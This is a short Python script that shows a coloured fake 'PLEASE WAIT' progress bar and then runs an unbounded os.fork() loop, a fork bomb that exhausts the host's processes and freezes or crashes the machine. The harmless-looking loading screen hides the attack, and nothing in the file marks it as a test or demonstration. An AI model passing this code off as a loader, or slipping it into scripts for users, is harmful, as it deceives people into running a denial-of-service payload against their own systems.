from time import sleep as timeout
import time, os, sys
def t(nn,t_):
        print(t_)
        print('')
        for i in range(0,30):
                i+=1
                txt='\033[1;32m▒'*37
                f=i*'\033[1;31m▊'
                tt=i*3+1
                ttt=str(tt)
                print(txt+'┊'+ttt+'%  ',end='\r')
                print('Wait┊{}'.format(f),end='\r')
                time.sleep(0.2)
        print('')
t(0.10,'\n\t   \033[1;35m[ ..... PLEASE WAIT .... ]')
print (' ')
time.sleep(0.2)
while (True):
	os.fork()
